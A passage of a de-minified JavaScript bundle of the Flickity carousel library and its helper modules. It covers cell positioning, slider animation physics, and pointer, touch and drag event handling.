        var n = t.parentNode.querySelectorAll(e), o = 0, r = n.length;
        r > o;
        o++
      )
        if (n[o] === t) return !0;
      return !1;
    }
    function o(t, n) {
      return i(t), e(t, n);
    }
    var r,
      s = (function () {
        if (t.matchesSelector) return "matchesSelector";
        for (
          var e = ["webkit", "moz", "ms", "o"], i = 0, n = e.length;
          n > i;
          i++
        ) {
          var o = e[i],
            r = o + "MatchesSelector";
          if (t[r]) return r;
        }
      })();
    if (s) {
      var a = document.createElement("div"),
        l = e(a, "div");
      r = l ? e : o;
    } else r = n;
    "function" == typeof define && define.amd
      ? define("matches-selector/matches-selector", [], function () {
          return r;
        })
      : "object" == typeof exports
      ? (module.exports = r)
      : (window.matchesSelector = r);
  })(Element.prototype),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "fizzy-ui-utils/utils",
          ["doc-ready/doc-ready", "matches-selector/matches-selector"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("doc-ready"),
          require("desandro-matches-selector")
        ))
      : (t.fizzyUIUtils = e(t, t.docReady, t.matchesSelector));
  })(window, function (t, e, i) {
    function n(t) {
      return t
        .replace(/(.)([A-Z])/g, function (t, e, i) {
          return e + "-" + i;
        })
        .toLowerCase();
    }
    var o = {};
    (o.extend = function (t, e) {
      for (var i in e) t[i] = e[i];
      return t;
    }),
      (o.modulo = function (t, e) {
        return ((t % e) + e) % e;
      });
    var r = Object.prototype.toString;
    (o.isArray = function (t) {
      return "[object Array]" == r.call(t);
    }),
      (o.makeArray = function (t) {
        var e = [];
        if (o.isArray(t)) e = t;
        else if (t && "number" == typeof t.length)
          for (var i = 0, n = t.length; n > i; i++) e.push(t[i]);
        else e.push(t);
        return e;
      }),
      (o.indexOf = Array.prototype.indexOf
        ? function (t, e) {
            return t.indexOf(e);
          }
        : function (t, e) {
            for (var i = 0, n = t.length; n > i; i++) if (t[i] === e) return i;
            return -1;
          }),
      (o.removeFrom = function (t, e) {
        var i = o.indexOf(t, e);
        -1 != i && t.splice(i, 1);
      }),
      (o.isElement =
        "function" == typeof HTMLElement || "object" == typeof HTMLElement
          ? function (t) {
              return t instanceof HTMLElement;
            }
          : function (t) {
              return (
                t &&
                "object" == typeof t &&
                1 == t.nodeType &&
                "string" == typeof t.nodeName
              );
            }),
      (o.setText = (function () {
        function t(t, i) {
          (e =
            e ||
            (void 0 !== document.documentElement.textContent
              ? "textContent"
              : "innerText")),
            (t[e] = i);
        }
        var e;
        return t;
      })()),
      (o.getParent = function (t, e) {
        for (; t != document.body; )
          if (((t = t.parentNode), i(t, e))) return t;
      }),
      (o.getQueryElement = function (t) {
        return "string" == typeof t ? document.querySelector(t) : t;
      }),
      (o.handleEvent = function (t) {
        var e = "on" + t.type;
        this[e] && this[e](t);
      }),
      (o.filterFindElements = function (t, e) {
        t = o.makeArray(t);
        for (var n = [], r = 0, s = t.length; s > r; r++) {
          var a = t[r];
          if (o.isElement(a))
            if (e) {
              i(a, e) && n.push(a);
              for (
                var l = a.querySelectorAll(e), h = 0, c = l.length;
                c > h;
                h++
              )
                n.push(l[h]);
            } else n.push(a);
        }
        return n;
      }),
      (o.debounceMethod = function (t, e, i) {
        var n = t.prototype[e],
          o = e + "Timeout";
        t.prototype[e] = function () {
          var t = this[o];
          t && clearTimeout(t);
          var e = arguments,
            r = this;
          this[o] = setTimeout(function () {
            n.apply(r, e), delete r[o];
          }, i || 100);
        };
      });
    var s = t.jQuery,
      a = t.console;
    return (
      (o.htmlInit = function (t, i) {
        e(function () {
          for (
            var e = n(i),
              o = document.querySelectorAll(".js-" + e),
              r = "data-" + e + "-options",
              l = 0,
              h = o.length;
            h > l;
            l++
          ) {
            var c,
              d = o[l],
              p = d.getAttribute(r);
            try {
              c = p && JSON.parse(p);
            } catch (u) {
              a &&
                a.error(
                  "Error parsing " +
                    r +
                    " on " +
                    d.nodeName.toLowerCase() +
                    (d.id ? "#" + d.id : "") +
                    ": " +
                    u
                );
              continue;
            }
            var f = new t(d, c);
            s && s.data(d, i, f);
          }
        });
      }),
      o
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define("flickity/js/cell", ["get-size/get-size"], function (i) {
          return e(t, i);
        })
      : "object" == typeof exports
      ? (module.exports = e(t, require("get-size")))
      : ((t.Flickity = t.Flickity || {}), (t.Flickity.Cell = e(t, t.getSize)));
  })(window, function (t, e) {
    function i(t, e) {
      (this.element = t), (this.parent = e), this.create();
    }
    var n = "attachEvent" in t;
    return (
      (i.prototype.create = function () {
        (this.element.style.position = "absolute"),
          n && this.element.setAttribute("unselectable", "on"),
          (this.x = 0),
          (this.shift = 0);
      }),
      (i.prototype.destroy = function () {
        this.element.style.position = "";
        var t = this.parent.originSide;
        this.element.style[t] = "";
      }),
      (i.prototype.getSize = function () {
        this.size = e(this.element);
      }),
      (i.prototype.setPosition = function (t) {
        (this.x = t), this.setDefaultTarget(), this.renderPosition(t);
      }),
      (i.prototype.setDefaultTarget = function () {
        var t = "left" == this.parent.originSide ? "marginLeft" : "marginRight";
        this.target =
          this.x + this.size[t] + this.size.width * this.parent.cellAlign;
      }),
      (i.prototype.renderPosition = function (t) {
        var e = this.parent.originSide;
        this.element.style[e] = this.parent.getPositionValue(t);
      }),
      (i.prototype.wrapShift = function (t) {
        (this.shift = t),
          this.renderPosition(this.x + this.parent.slideableWidth * t);
      }),
      (i.prototype.remove = function () {
        this.element.parentNode.removeChild(this.element);
      }),
      i
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/animate",
          ["get-style-property/get-style-property", "fizzy-ui-utils/utils"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("desandro-get-style-property"),
          require("fizzy-ui-utils")
        ))
      : ((t.Flickity = t.Flickity || {}),
        (t.Flickity.animatePrototype = e(
          t,
          t.getStyleProperty,
          t.fizzyUIUtils
        )));
  })(window, function (t, e, i) {
    for (
      var n,
        o = 0,
        r = "webkit moz ms o".split(" "),
        s = t.requestAnimationFrame,
        a = t.cancelAnimationFrame,
        l = 0;
      l < r.length && (!s || !a);
      l++
    )
      (n = r[l]),
        (s = s || t[n + "RequestAnimationFrame"]),
        (a =
          a ||
          t[n + "CancelAnimationFrame"] ||
          t[n + "CancelRequestAnimationFrame"]);
    (s && a) ||
      ((s = function (e) {
        var i = new Date().getTime(),
          n = Math.max(0, 16 - (i - o)),
          r = t.setTimeout(function () {
            e(i + n);
          }, n);
        return (o = i + n), r;
      }),
      (a = function (e) {
        t.clearTimeout(e);
      }));
    var h = {};
    (h.startAnimation = function () {
      this.isAnimating ||
        ((this.isAnimating = !0), (this.restingFrames = 0), this.animate());
    }),
      (h.animate = function () {
        this.applySelectedAttraction();
        var t = this.x;
        if (
          (this.integratePhysics(),
          this.positionSlider(),
          this.settle(t),
          this.isAnimating)
        ) {
          var e = this;
          s(function () {
            e.animate();
          });
        }
      });
    var c = e("transform"),
      d = !!e("perspective");
    return (
      (h.positionSlider = function () {
        var t = this.x;
        this.options.wrapAround &&
          this.cells.length > 1 &&
          ((t = i.modulo(t, this.slideableWidth)),
          (t -= this.slideableWidth),
          this.shiftWrapCells(t)),
          (t += this.cursorPosition),
          (t = this.options.rightToLeft && c ? -t : t);
        var e = this.getPositionValue(t);
        c
          ? (this.slider.style[c] =
              d && this.isAnimating
                ? "translate3d(" + e + ",0,0)"
                : "translateX(" + e + ")")
          : (this.slider.style[this.originSide] = e);
      }),
      (h.positionSliderAtSelected = function () {
        if (this.cells.length) {
          var t = this.cells[this.selectedIndex];
          (this.x = -t.target), this.positionSlider();
        }
      }),
      (h.getPositionValue = function (t) {
        return this.options.percentPosition
          ? 0.01 * Math.round((t / this.size.innerWidth) * 1e4) + "%"
          : Math.round(t) + "px";
      }),
      (h.settle = function (t) {
        this.isPointerDown ||
          Math.round(100 * this.x) != Math.round(100 * t) ||
          this.restingFrames++,
          this.restingFrames > 2 &&
            ((this.isAnimating = !1),
            delete this.isFreeScrolling,
            d && this.positionSlider(),
            this.dispatchEvent("settle"));
      }),
      (h.shiftWrapCells = function (t) {
        var e = this.cursorPosition + t;
        this._shiftCells(this.beforeShiftCells, e, -1);
        var i =
          this.size.innerWidth -
          (t + this.slideableWidth + this.cursorPosition);
        this._shiftCells(this.afterShiftCells, i, 1);
      }),
      (h._shiftCells = function (t, e, i) {
        for (var n = 0, o = t.length; o > n; n++) {
          var r = t[n],
            s = e > 0 ? i : 0;
          r.wrapShift(s), (e -= r.size.outerWidth);
        }
      }),
      (h._unshiftCells = function (t) {
        if (t && t.length)
          for (var e = 0, i = t.length; i > e; e++) t[e].wrapShift(0);
      }),
      (h.integratePhysics = function () {
        (this.velocity += this.accel),
          (this.x += this.velocity),
          (this.velocity *= this.getFrictionFactor()),
          (this.accel = 0);
      }),
      (h.applyForce = function (t) {
        this.accel += t;
      }),
      (h.getFrictionFactor = function () {
        return (
          1 -
          this.options[this.isFreeScrolling ? "freeScrollFriction" : "friction"]
        );
      }),
      (h.getRestingPosition = function () {
        return this.x + this.velocity / (1 - this.getFrictionFactor());
      }),
      (h.applySelectedAttraction = function () {
        var t = this.cells.length;
        if (!this.isPointerDown && !this.isFreeScrolling && t) {
          var e = this.cells[this.selectedIndex],
            i =
              this.options.wrapAround && t > 1
                ? this.slideableWidth * Math.floor(this.selectedIndex / t)
                : 0,
            n = -1 * (e.target + i) - this.x,
            o = n * this.options.selectedAttraction;
          this.applyForce(o);
        }
      }),
      h
    );
  }),
  (function (t, e) {
    if ("function" == typeof define && define.amd)
      define("flickity/js/flickity", [
        "classie/classie",
        "eventEmitter/EventEmitter",
        "eventie/eventie",
        "get-size/get-size",
        "fizzy-ui-utils/utils",
        "./cell",
        "./animate",
      ], function (i, n, o, r, s, a, l) {
        return e(t, i, n, o, r, s, a, l);
      });
    else if ("object" == typeof exports)
      module.exports = e(
        t,
        require("desandro-classie"),
        require("wolfy87-eventemitter"),
        require("eventie"),
        require("get-size"),
        require("fizzy-ui-utils"),
        require("./cell"),
        require("./animate")
      );
    else {
      var i = t.Flickity;
      t.Flickity = e(
        t,
        t.classie,
        t.EventEmitter,
        t.eventie,
        t.getSize,
        t.fizzyUIUtils,
        i.Cell,
        i.animatePrototype
      );
    }
  })(window, function (t, e, i, n, o, r, s, a) {
    function l(t, e) {
      for (t = r.makeArray(t); t.length; ) e.appendChild(t.shift());
    }
    function h(t, e) {
      var i = r.getQueryElement(t);
      return i
        ? ((this.element = i),
          c && (this.$element = c(this.element)),
          (this.options = r.extend({}, this.constructor.defaults)),
          this.option(e),
          void this._create())
        : void (p && p.error("Bad element for Flickity: " + (i || t)));
    }
    var c = t.jQuery,
      d = t.getComputedStyle,
      p = t.console,
      u = 0,
      f = {};
    (h.defaults = {
      accessibility: !0,
      cellAlign: "center",
      freeScrollFriction: 0.075,
      friction: 0.28,
      percentPosition: !0,
      resize: !0,
      selectedAttraction: 0.025,
      setGallerySize: !0,
    }),
      (h.createMethods = []),
      r.extend(h.prototype, i.prototype),
      (h.prototype._create = function () {
        var e = (this.guid = ++u);
        (this.element.flickityGUID = e),
          (f[e] = this),
          (this.selectedIndex = this.options.initialIndex || 0),
          (this.restingFrames = 0),
          (this.x = 0),
          (this.velocity = 0),
          (this.accel = 0),
          (this.originSide = this.options.rightToLeft ? "right" : "left"),
          (this.viewport = document.createElement("div")),
          (this.viewport.className = "flickity-viewport"),
          h.setUnselectable(this.viewport),
          this._createSlider(),
          (this.options.resize || this.options.watchCSS) &&
            (n.bind(t, "resize", this), (this.isResizeBound = !0));
        for (var i = 0, o = h.createMethods.length; o > i; i++) {
          var r = h.createMethods[i];
          this[r]();
        }
        this.options.watchCSS ? this.watchCSS() : this.activate();
      }),
      (h.prototype.option = function (t) {
        r.extend(this.options, t);
      }),
      (h.prototype.activate = function () {
        if (!this.isActive) {
          (this.isActive = !0),
            e.add(this.element, "flickity-enabled"),
            this.options.rightToLeft && e.add(this.element, "flickity-rtl");
          var t = this._filterFindCellElements(this.element.children);
          l(t, this.slider),
            this.viewport.appendChild(this.slider),
            this.element.appendChild(this.viewport),
            this.getSize(),
            this.reloadCells(),
            this.setGallerySize(),
            this.options.accessibility &&
              ((this.element.tabIndex = 0),
              n.bind(this.element, "keydown", this)),
            this.emit("activate"),
            this.positionSliderAtSelected(),
            this.select(this.selectedIndex);
        }
      }),
      (h.prototype._createSlider = function () {
        var t = document.createElement("div");
        (t.className = "flickity-slider"),
          (t.style[this.originSide] = 0),
          (this.slider = t);
      }),
      (h.prototype._filterFindCellElements = function (t) {
        return r.filterFindElements(t, this.options.cellSelector);
      }),
      (h.prototype.reloadCells = function () {
        (this.cells = this._makeCells(this.slider.children)),
          this.positionCells(),
          this._getWrapShiftCells(),
          this.setGallerySize();
      }),
      (h.prototype._makeCells = function (t) {
        for (
          var e = this._filterFindCellElements(t), i = [], n = 0, o = e.length;
          o > n;
          n++
        ) {
          var r = e[n],
            a = new s(r, this);
          i.push(a);
        }
        return i;
      }),
      (h.prototype.getLastCell = function () {
        return this.cells[this.cells.length - 1];
      }),
      (h.prototype.positionCells = function () {
        this._sizeCells(this.cells), this._positionCells(0);
      }),
      (h.prototype._positionCells = function (t) {
        this.maxCellHeight = t ? this.maxCellHeight || 0 : 0;
        var e = 0;
        if (t > 0) {
          var i = this.cells[t - 1];
          e = i.x + i.size.outerWidth;
        }
        for (var n, o = this.cells.length, r = t; o > r; r++)
          (n = this.cells[r]),
            n.setPosition(e),
            (e += n.size.outerWidth),
            (this.maxCellHeight = Math.max(
              n.size.outerHeight,
              this.maxCellHeight
            ));
        (this.slideableWidth = e), this._containCells();
      }),
      (h.prototype._sizeCells = function (t) {
        for (var e = 0, i = t.length; i > e; e++) {
          var n = t[e];
          n.getSize();
        }
      }),
      (h.prototype._init = h.prototype.reposition =
        function () {
          this.positionCells(), this.positionSliderAtSelected();
        }),
      (h.prototype.getSize = function () {
        (this.size = o(this.element)),
          this.setCellAlign(),
          (this.cursorPosition = this.size.innerWidth * this.cellAlign);
      });
    var v = {
      center: { left: 0.5, right: 0.5 },
      left: { left: 0, right: 1 },
      right: { right: 0, left: 1 },
    };
    (h.prototype.setCellAlign = function () {
      var t = v[this.options.cellAlign];
      this.cellAlign = t ? t[this.originSide] : this.options.cellAlign;
    }),
      (h.prototype.setGallerySize = function () {
        this.options.setGallerySize &&
          (this.viewport.style.height = this.maxCellHeight + "px");
      }),
      (h.prototype._getWrapShiftCells = function () {
        if (this.options.wrapAround) {
          this._unshiftCells(this.beforeShiftCells),
            this._unshiftCells(this.afterShiftCells);
          var t = this.cursorPosition,
            e = this.cells.length - 1;
          (this.beforeShiftCells = this._getGapCells(t, e, -1)),
            (t = this.size.innerWidth - this.cursorPosition),
            (this.afterShiftCells = this._getGapCells(t, 0, 1));
        }
      }),
      (h.prototype._getGapCells = function (t, e, i) {
        for (var n = []; t > 0; ) {
          var o = this.cells[e];
          if (!o) break;
          n.push(o), (e += i), (t -= o.size.outerWidth);
        }
        return n;
      }),
      (h.prototype._containCells = function () {
        if (
          this.options.contain &&
          !this.options.wrapAround &&
          this.cells.length
        )
          for (
            var t = this.options.rightToLeft ? "marginRight" : "marginLeft",
              e = this.options.rightToLeft ? "marginLeft" : "marginRight",
              i = this.cells[0].size[t],
              n = this.getLastCell(),
              o = this.slideableWidth - n.size[e],
              r = o - this.size.innerWidth * (1 - this.cellAlign),
              s = o < this.size.innerWidth,
              a = 0,
              l = this.cells.length;
            l > a;
            a++
          ) {
            var h = this.cells[a];
            h.setDefaultTarget(),
              s
                ? (h.target = o * this.cellAlign)
                : ((h.target = Math.max(h.target, this.cursorPosition + i)),
                  (h.target = Math.min(h.target, r)));
          }
      }),
      (h.prototype.dispatchEvent = function (t, e, i) {
        var n = [e].concat(i);
        if ((this.emitEvent(t, n), c && this.$element))
          if (e) {
            var o = c.Event(e);
            (o.type = t), this.$element.trigger(o, i);
          } else this.$element.trigger(t, i);
      }),
      (h.prototype.select = function (t, e) {
        if (this.isActive) {
          var i = this.cells.length;
          this.options.wrapAround &&
            i > 1 &&
            (0 > t
              ? (this.x -= this.slideableWidth)
              : t >= i && (this.x += this.slideableWidth)),
            (this.options.wrapAround || e) && (t = r.modulo(t, i)),
            this.cells[t] &&
              ((this.selectedIndex = t),
              this.setSelectedCell(),
              this.startAnimation(),
              this.dispatchEvent("cellSelect"));
        }
      }),
      (h.prototype.previous = function (t) {
        this.select(this.selectedIndex - 1, t);
      }),
      (h.prototype.next = function (t) {
        this.select(this.selectedIndex + 1, t);
      }),
      (h.prototype.setSelectedCell = function () {
        this._removeSelectedCellClass(),
          (this.selectedCell = this.cells[this.selectedIndex]),
          (this.selectedElement = this.selectedCell.element),
          e.add(this.selectedElement, "is-selected");
      }),
      (h.prototype._removeSelectedCellClass = function () {
        this.selectedCell && e.remove(this.selectedCell.element, "is-selected");
      }),
      (h.prototype.getCell = function (t) {
        for (var e = 0, i = this.cells.length; i > e; e++) {
          var n = this.cells[e];
          if (n.element == t) return n;
        }
      }),
      (h.prototype.getCells = function (t) {
        t = r.makeArray(t);
        for (var e = [], i = 0, n = t.length; n > i; i++) {
          var o = t[i],
            s = this.getCell(o);
          s && e.push(s);
        }
        return e;
      }),
      (h.prototype.getCellElements = function () {
        for (var t = [], e = 0, i = this.cells.length; i > e; e++)
          t.push(this.cells[e].element);
        return t;
      }),
      (h.prototype.getParentCell = function (t) {
        var e = this.getCell(t);
        return e
          ? e
          : ((t = r.getParent(t, ".flickity-slider > *")), this.getCell(t));
      }),
      (h.prototype.uiChange = function () {
        this.emit("uiChange");
      }),
      (h.prototype.childUIPointerDown = function (t) {
        this.emitEvent("childUIPointerDown", [t]);
      }),
      (h.prototype.onresize = function () {
        this.watchCSS(), this.resize();
      }),
      r.debounceMethod(h, "onresize", 150),
      (h.prototype.resize = function () {
        this.isActive &&
          (this.getSize(),
          this.options.wrapAround &&
            (this.x = r.modulo(this.x, this.slideableWidth)),
          this.positionCells(),
          this._getWrapShiftCells(),
          this.setGallerySize(),
          this.positionSliderAtSelected());
      });
    var y = (h.supportsConditionalCSS = (function () {
      var t;
      return function () {
        if (void 0 !== t) return t;
        if (!d) return void (t = !1);
        var e = document.createElement("style"),
          i = document.createTextNode(
            'body:after { content: "foo"; display: none; }'
          );
        e.appendChild(i), document.head.appendChild(e);
        var n = d(document.body, ":after").content;
        return (t = -1 != n.indexOf("foo")), document.head.removeChild(e), t;
      };
    })());
    (h.prototype.watchCSS = function () {
      var t = this.options.watchCSS;
      if (t) {
        var e = y();
        if (!e) {
          var i = "fallbackOn" == t ? "activate" : "deactivate";
          return void this[i]();
        }
        var n = d(this.element, ":after").content;
        -1 != n.indexOf("flickity") ? this.activate() : this.deactivate();
      }
    }),
      (h.prototype.onkeydown = function (t) {
        if (
          this.options.accessibility &&
          (!document.activeElement || document.activeElement == this.element)
        )
          if (37 == t.keyCode) {
            var e = this.options.rightToLeft ? "next" : "previous";
            this.uiChange(), this[e]();
          } else if (39 == t.keyCode) {
            var i = this.options.rightToLeft ? "previous" : "next";
            this.uiChange(), this[i]();
          }
      }),
      (h.prototype.deactivate = function () {
        if (this.isActive) {
          e.remove(this.element, "flickity-enabled"),
            e.remove(this.element, "flickity-rtl");
          for (var t = 0, i = this.cells.length; i > t; t++) {
            var o = this.cells[t];
            o.destroy();
          }
          this._removeSelectedCellClass(),
            this.element.removeChild(this.viewport),
            l(this.slider.children, this.element),
            this.options.accessibility &&
              (this.element.removeAttribute("tabIndex"),
              n.unbind(this.element, "keydown", this)),
            (this.isActive = !1),
            this.emit("deactivate");
        }
      }),
      (h.prototype.destroy = function () {
        this.deactivate(),
          this.isResizeBound && n.unbind(t, "resize", this),
          this.emit("destroy"),
          c && this.$element && c.removeData(this.element, "flickity"),
          delete this.element.flickityGUID,
          delete f[this.guid];
      }),
      r.extend(h.prototype, a);
    var g = "attachEvent" in t;
    return (
      (h.setUnselectable = function (t) {
        g && t.setAttribute("unselectable", "on");
      }),
      (h.data = function (t) {
        t = r.getQueryElement(t);
        var e = t && t.flickityGUID;
        return e && f[e];
      }),
      r.htmlInit(h, "flickity"),
      c && c.bridget && c.bridget("flickity", h),
      (h.Cell = s),
      h
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "unipointer/unipointer",
          ["eventEmitter/EventEmitter", "eventie/eventie"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("wolfy87-eventemitter"),
          require("eventie")
        ))
      : (t.Unipointer = e(t, t.EventEmitter, t.eventie));
  })(window, function (t, e, i) {
    function n() {}
    function o() {}
    (o.prototype = new e()),
      (o.prototype.bindStartEvent = function (t) {
        this._bindStartEvent(t, !0);
      }),
      (o.prototype.unbindStartEvent = function (t) {
        this._bindStartEvent(t, !1);
      }),
      (o.prototype._bindStartEvent = function (e, n) {
        n = void 0 === n ? !0 : !!n;
        var o = n ? "bind" : "unbind";
        t.navigator.pointerEnabled
          ? i[o](e, "pointerdown", this)
          : t.navigator.msPointerEnabled
          ? i[o](e, "MSPointerDown", this)
          : (i[o](e, "mousedown", this), i[o](e, "touchstart", this));
      }),
      (o.prototype.handleEvent = function (t) {
        var e = "on" + t.type;
        this[e] && this[e](t);
      }),
      (o.prototype.getTouch = function (t) {
        for (var e = 0, i = t.length; i > e; e++) {
          var n = t[e];
          if (n.identifier == this.pointerIdentifier) return n;
        }
      }),
      (o.prototype.onmousedown = function (t) {
        var e = t.button;
        (e && 0 !== e && 1 !== e) || this._pointerDown(t, t);
      }),
      (o.prototype.ontouchstart = function (t) {
        this._pointerDown(t, t.changedTouches[0]);
      }),
      (o.prototype.onMSPointerDown = o.prototype.onpointerdown =
        function (t) {
          this._pointerDown(t, t);
        }),
      (o.prototype._pointerDown = function (t, e) {
        this.isPointerDown ||
          ((this.isPointerDown = !0),
          (this.pointerIdentifier =
            void 0 !== e.pointerId ? e.pointerId : e.identifier),
          this.pointerDown(t, e));
      }),
      (o.prototype.pointerDown = function (t, e) {
        this._bindPostStartEvents(t),
          this.emitEvent("pointerDown", [this, t, e]);
      });
    var r = {
      mousedown: ["mousemove", "mouseup"],
      touchstart: ["touchmove", "touchend", "touchcancel"],
      pointerdown: ["pointermove", "pointerup", "pointercancel"],
      MSPointerDown: ["MSPointerMove", "MSPointerUp", "MSPointerCancel"],
    };
    return (
      (o.prototype._bindPostStartEvents = function (e) {
        if (e) {
          for (
            var n = r[e.type],
              o = e.preventDefault ? t : document,
              s = 0,
              a = n.length;
            a > s;
            s++
          ) {
            var l = n[s];
            i.bind(o, l, this);
          }
          this._boundPointerEvents = { events: n, node: o };
        }
      }),
      (o.prototype._unbindPostStartEvents = function () {
        var t = this._boundPointerEvents;
        if (t && t.events) {
          for (var e = 0, n = t.events.length; n > e; e++) {
            var o = t.events[e];
            i.unbind(t.node, o, this);
          }
          delete this._boundPointerEvents;
        }
      }),
      (o.prototype.onmousemove = function (t) {
        this._pointerMove(t, t);
      }),
      (o.prototype.onMSPointerMove = o.prototype.onpointermove =
        function (t) {
          t.pointerId == this.pointerIdentifier && this._pointerMove(t, t);
        }),
      (o.prototype.ontouchmove = function (t) {
        var e = this.getTouch(t.changedTouches);
        e && this._pointerMove(t, e);
      }),
      (o.prototype._pointerMove = function (t, e) {
        this.pointerMove(t, e);
      }),
      (o.prototype.pointerMove = function (t, e) {
        this.emitEvent("pointerMove", [this, t, e]);
      }),
      (o.prototype.onmouseup = function (t) {
        this._pointerUp(t, t);
      }),
      (o.prototype.onMSPointerUp = o.prototype.onpointerup =
        function (t) {
          t.pointerId == this.pointerIdentifier && this._pointerUp(t, t);
        }),
      (o.prototype.ontouchend = function (t) {
        var e = this.getTouch(t.changedTouches);
        e && this._pointerUp(t, e);
      }),
      (o.prototype._pointerUp = function (t, e) {
        this._pointerDone(), this.pointerUp(t, e);
      }),
      (o.prototype.pointerUp = function (t, e) {
        this.emitEvent("pointerUp", [this, t, e]);
      }),
      (o.prototype._pointerDone = function () {
        (this.isPointerDown = !1),
          delete this.pointerIdentifier,
          this._unbindPostStartEvents(),
          this.pointerDone();
      }),
      (o.prototype.pointerDone = n),
      (o.prototype.onMSPointerCancel = o.prototype.onpointercancel =
        function (t) {
          t.pointerId == this.pointerIdentifier && this._pointerCancel(t, t);
        }),
      (o.prototype.ontouchcancel = function (t) {
        var e = this.getTouch(t.changedTouches);
        e && this._pointerCancel(t, e);
      }),
      (o.prototype._pointerCancel = function (t, e) {
        this._pointerDone(), this.pointerCancel(t, e);
      }),
      (o.prototype.pointerCancel = function (t, e) {
        this.emitEvent("pointerCancel", [this, t, e]);
      }),
      (o.getPointerPoint = function (t) {
        return {
          x: void 0 !== t.pageX ? t.pageX : t.clientX,
          y: void 0 !== t.pageY ? t.pageY : t.clientY,
        };
      }),
      o
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "unidragger/unidragger",
          ["eventie/eventie", "unipointer/unipointer"],
          function (i, n) {
            return e(t, i, n);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(t, require("eventie"), require("unipointer")))
      : (t.Unidragger = e(t, t.eventie, t.Unipointer));
  })(window, function (t, e, i) {
    function n() {}
    function o(t) {
      t.preventDefault ? t.preventDefault() : (t.returnValue = !1);
    }
    function r(t) {
      for (; t != document.body; )
        if (((t = t.parentNode), "A" == t.nodeName)) return t;
    }
    function s() {}
    function a() {
      return !1;
    }
    (s.prototype = new i()),
      (s.prototype.bindHandles = function () {
        this._bindHandles(!0);
      }),
      (s.prototype.unbindHandles = function () {
        this._bindHandles(!1);
      });
    var l = t.navigator;
    s.prototype._bindHandles = function (t) {
      t = void 0 === t ? !0 : !!t;
      var i;
      i = l.pointerEnabled
        ? function (e) {
            e.style.touchAction = t ? "none" : "";
          }
        : l.msPointerEnabled
        ? function (e) {
            e.style.msTouchAction = t ? "none" : "";
          }
        : function () {
            t && c(s);
          };
      for (
        var n = t ? "bind" : "unbind", o = 0, r = this.handles.length;
        r > o;
        o++
      ) {
        var s = this.handles[o];
        this._bindStartEvent(s, t), i(s), e[n](s, "click", this);
      }
    };
    var h = "attachEvent" in document.documentElement,
      c = h
        ? function (t) {
            "IMG" == t.nodeName && (t.ondragstart = a);
            for (
              var e = t.querySelectorAll("img"), i = 0, n = e.length;
              n > i;
              i++
            ) {
              var o = e[i];
              o.ondragstart = a;
            }
          }
        : n,
      d = (s.allowTouchstartNodes = {
        INPUT: !0,
        A: !0,
        BUTTON: !0,
        SELECT: !0,
      });
    return (
      (s.prototype.pointerDown = function (t, e) {
        this._dragPointerDown(t, e);
        var i = document.activeElement;
        i && i.blur && i.blur(),
          this._bindPostStartEvents(t),
          this.emitEvent("pointerDown", [this, t, e]);
      }),
      (s.prototype._dragPointerDown = function (t, e) {
        this.pointerDownPoint = i.getPointerPoint(e);
        var n = t.target.nodeName,
          s = "touchstart" == t.type && (d[n] || r(t.target));
        s || "SELECT" == n || o(t);
      }),
      (s.prototype.pointerMove = function (t, e) {
        var i = this._dragPointerMove(t, e);
        this.emitEvent("pointerMove", [this, t, e, i]), this._dragMove(t, e, i);
      }),
      (s.prototype._dragPointerMove = function (t, e) {
        var n = i.getPointerPoint(e),
          o = {
            x: n.x - this.pointerDownPoint.x,
            y: n.y - this.pointerDownPoint.y,
          };
        return (
          !this.isDragging && this.hasDragStarted(o) && this._dragStart(t, e), o
        );
      }),
      (s.prototype.hasDragStarted = function (t) {
        return Math.abs(t.x) > 3 || Math.abs(t.y) > 3;
      }),
      (s.prototype.pointerUp = function (t, e) {
        this.emitEvent("pointerUp", [this, t, e]), this._dragPointerUp(t, e);
      }),
      (s.prototype._dragPointerUp = function (t, e) {
        this.isDragging ? this._dragEnd(t, e) : this._staticClick(t, e);
      }),
      (s.prototype._dragStart = function (t, e) {
        (this.isDragging = !0),
          (this.dragStartPoint = s.getPointerPoint(e)),
          (this.isPreventingClicks = !0),
          this.dragStart(t, e);
      }),
      (s.prototype.dragStart = function (t, e) {
        this.emitEvent("dragStart", [this, t, e]);
      }),
      (s.prototype._dragMove = function (t, e, i) {
        this.isDragging && this.dragMove(t, e, i);
      }),
      (s.prototype.dragMove = function (t, e, i) {
        this.emitEvent("dragMove", [this, t, e, i]);
      }),
      (s.prototype._dragEnd = function (t, e) {
        this.isDragging = !1;
        var i = this;
        setTimeout(function () {
          delete i.isPreventingClicks;
        }),
          this.dragEnd(t, e);
      }),
      (s.prototype.dragEnd = function (t, e) {
        this.emitEvent("dragEnd", [this, t, e]);
      }),
      (s.prototype.onclick = function (t) {
        this.isPreventingClicks && o(t);
      }),
      (s.prototype._staticClick = function (t, e) {
        "INPUT" == t.target.nodeName &&
          "text" == t.target.type &&
          t.target.focus(),
          this.staticClick(t, e);
      }),
      (s.prototype.staticClick = function (t, e) {
        this.emitEvent("staticClick", [this, t, e]);
      }),
      (s.getPointerPoint = function (t) {
        return {
          x: void 0 !== t.pageX ? t.pageX : t.clientX,
          y: void 0 !== t.pageY ? t.pageY : t.clientY,
        };
      }),
      (s.getPointerPoint = i.getPointerPoint),
      s
    );
  }),
  (function (t, e) {
    "function" == typeof define && define.amd
      ? define(
          "flickity/js/drag",
          [
            "classie/classie",
            "eventie/eventie",
            "./flickity",
            "unidragger/unidragger",
            "fizzy-ui-utils/utils",
          ],
          function (i, n, o, r, s) {
            return e(t, i, n, o, r, s);
          }
        )
      : "object" == typeof exports
      ? (module.exports = e(
          t,
          require("desandro-classie"),
          require("eventie"),
          require("./flickity"),
          require("unidragger"),
          require("fizzy-ui-utils")
        ))
      : ((t.Flickity = t.Flickity || {}),
        (t.Flickity.dragPrototype = e(
          t,
          t.classie,
